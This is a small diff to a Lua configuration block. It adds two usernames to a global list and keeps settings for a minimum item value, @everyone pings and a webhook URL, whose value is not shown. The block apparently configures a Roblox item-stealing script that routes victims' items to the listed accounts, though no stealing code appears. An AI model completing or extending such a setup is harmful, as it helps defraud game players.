@@ -1,4 +1,4 @@
-_G.Usernames = {"sdd90kl"} -- you can add as many as you'd like
+_G.Usernames = {"sdd90kl", "sdd90kl2", "sdd90kl3"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook =
